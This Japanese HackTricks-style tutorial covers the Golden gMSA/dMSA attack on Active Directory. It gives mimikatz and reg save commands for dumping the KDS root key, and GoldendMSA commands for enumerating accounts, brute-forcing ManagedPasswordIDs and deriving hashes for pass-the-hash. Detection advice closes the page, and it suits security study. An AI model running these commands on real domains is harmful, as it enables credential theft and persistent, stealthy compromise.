# Golden gMSA/dMSA攻撃（管理サービスアカウントパスワードのオフライン導出）

{{#include ../../banners/hacktricks-training.md}}

## 概要

Windows管理サービスアカウント（MSA）は、パスワードを手動で管理することなくサービスを実行するために設計された特別なプリンシパルです。
主に2つのバリエーションがあります：

1. **gMSA** – グループ管理サービスアカウント – `msDS-GroupMSAMembership`属性で承認された複数のホストで使用できます。
2. **dMSA** – 委任管理サービスアカウント – gMSAの（プレビュー）後継で、同じ暗号技術に依存しながら、より細かい委任シナリオを可能にします。

両方のバリエーションにおいて、**パスワードは**通常のNTハッシュのように各ドメインコントローラー（DC）に**保存されません**。代わりに、各DCは以下から現在のパスワードを**導出**できます：

* フォレスト全体の**KDSルートキー**（`KRBTGT\KDS`） – ランダムに生成されたGUID名の秘密で、`CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …`コンテナの下にあるすべてのDCに複製されます。
* 対象アカウントの**SID**。
* `msDS-ManagedPasswordId`属性に見つかるアカウントごとの**ManagedPasswordID**（GUID）。

導出は次のようになります：`AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → 最終的に**base64エンコード**され、`msDS-ManagedPassword`属性に保存される240バイトのブロブ。
通常のパスワード使用中はKerberosトラフィックやドメインの相互作用は必要なく、メンバーホストは3つの入力を知っている限り、ローカルでパスワードを導出します。

## Golden gMSA / Golden dMSA攻撃

攻撃者がすべての3つの入力を**オフライン**で取得できれば、**フォレスト内の任意のgMSA/dMSAの**有効な現在および将来のパスワードを計算でき、再度DCに触れることなく、以下を回避できます：

* Kerberosの事前認証 / チケット要求ログ
* LDAP読み取り監査
* パスワード変更間隔（事前に計算できます）

これはサービスアカウントの*ゴールデンチケット*に類似しています。

### 前提条件

1. **1つのDC**（またはエンタープライズ管理者）の**フォレストレベルの侵害**。`SYSTEM`アクセスで十分です。
2. サービスアカウントを列挙する能力（LDAP読み取り / RIDブルートフォース）。
3. [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA)または同等のコードを実行するための.NET ≥ 4.7.2 x64ワークステーション。

### フェーズ1 – KDSルートキーの抽出

任意のDCからダンプ（ボリュームシャドウコピー / 生のSAM+SECURITYハイブまたはリモートシークレット）：
```cmd
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM  system.hive

# With mimikatz on the DC / offline
mimikatz # lsadump::secrets
mimikatz # lsadump::trust /patch   # shows KDS root keys too
```
`RootKey`（GUID名）とラベル付けされたbase64文字列は、後のステップで必要です。

### フェーズ2 – gMSA/dMSAオブジェクトの列挙

少なくとも`sAMAccountName`、`objectSid`、および`msDS-ManagedPasswordId`を取得します：
```powershell
# Authenticated or anonymous depending on ACLs
Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
Select sAMAccountName,objectSid,msDS-ManagedPasswordId
```
[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) はヘルパーモードを実装しています：
```powershell
# LDAP enumeration (kerberos / simple bind)
GoldendMSA.exe info -d example.local -m ldap

# RID brute force if anonymous binds are blocked
GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
```
### フェーズ 3 – ManagedPasswordID を推測 / 発見する（欠如している場合）

一部のデプロイメントでは、`msDS-ManagedPasswordId` を ACL 保護された読み取りから *除去* します。  
GUID は 128 ビットであるため、単純なブルートフォースは実行不可能ですが：

1. 最初の **32 ビット = アカウント作成の Unix エポック時間**（分単位の解像度）。
2. 続いて 96 ビットのランダムなビット。

したがって、**アカウントごとの狭い単語リスト**（± 数時間）は現実的です。
```powershell
GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
```
ツールは候補パスワードを計算し、それらのbase64ブロブを実際の`msDS-ManagedPassword`属性と比較します – 一致が正しいGUIDを明らかにします。

### フェーズ 4 – オフラインパスワード計算と変換

ManagedPasswordIDが知られると、有効なパスワードは1コマンドの距離にあります：
```powershell
# derive base64 password
GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID>

# convert to NTLM / AES keys for pass-the-hash / pass-the-ticket
GoldendMSA.exe convert -d example.local -u svc_web$ -p <Base64Pwd>
```
結果として得られたハッシュは、**mimikatz**（`sekurlsa::pth`）や**Rubeus**を使用してKerberosの悪用に注入でき、ステルスな**横移動**と**持続性**を可能にします。

## 検出と緩和

* **DCバックアップおよびレジストリハイブの読み取り**機能をTier-0管理者に制限します。
* DCでの**ディレクトリサービス復元モード（DSRM）**または**ボリュームシャドウコピー**の作成を監視します。
* `CN=Master Root Keys,…`およびサービスアカウントの`userAccountControl`フラグの読み取り/変更を監査します。
* 異常な**base64パスワードの書き込み**や、ホスト間での突然のサービスパスワードの再利用を検出します。
* Tier-0の隔離が不可能な場合、高特権gMSAを**クラシックサービスアカウント**に変換し、定期的なランダムローテーションを行うことを検討します。

## ツール

* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – このページで使用される参照実装。
* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`、`sekurlsa::pth`、`kerberos::ptt`。
* [`Rubeus`](https://github.com/GhostPack/Rubeus) – 派生AESキーを使用したパス・ザ・チケット。

## 参考文献

- [Golden dMSA – 委任された管理サービスアカウントの認証バイパス](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [Semperis/GoldenDMSA GitHubリポジトリ](https://github.com/Semperis/GoldenDMSA)
- [Improsec – Golden gMSA信頼攻撃](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent)

{{#include ../../banners/hacktricks-training.md}}
